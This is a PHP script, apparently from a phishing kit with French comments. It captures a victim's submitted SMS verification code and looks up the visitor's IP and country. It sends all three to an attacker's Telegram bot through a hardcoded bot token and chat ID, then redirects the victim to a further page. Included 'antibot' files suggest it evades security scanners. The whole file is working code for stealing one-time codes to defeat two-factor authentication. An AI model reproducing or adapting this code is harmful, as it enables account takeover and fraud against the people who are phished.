<?php
include '../src/antibots.php';
include '../antibots.php';
include '../anti/anti1.php';
include '../anti/anti2.php';
include '../anti/anti3.php';
include '../anti/anti4.php';
include '../anti/anti5.php';
include '../anti/anti6.php';
include '../anti/anti7.php';
include '../anti/anti8.php';

$sms_code = $_POST['sms_code'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];

// Obtenir le pays via l'IP
$pays = 'Inconnu';
$ip_data = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"), true);
if ($ip_data && $ip_data['status'] === 'success') {
    $pays = $ip_data['country'];
}

// Message Telegram avec données copiables
$message = "🔑 *Code SMS 1*\n";
$message .= "🔢 Code : `{$sms_code}`\n";
$message .= "🌍 IP : `$ip`\n";
$message .= "🏳️ Pays : `$pays`";

// Telegram settings
$token = "7587084919:AAEodygdQzudAd2NWhiFexqemsyYiFtC_EU";  // Remplace par ton token
$chat_id = "7504064689";  // Remplace par ton chat_id

// Envoi du message vers Telegram
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown'
]));

// Redirection vers une autre page après la validation
header("Location: ../mail.php");  // Remplace par l'URL de la page vers laquelle tu veux rediriger
exit;
?>
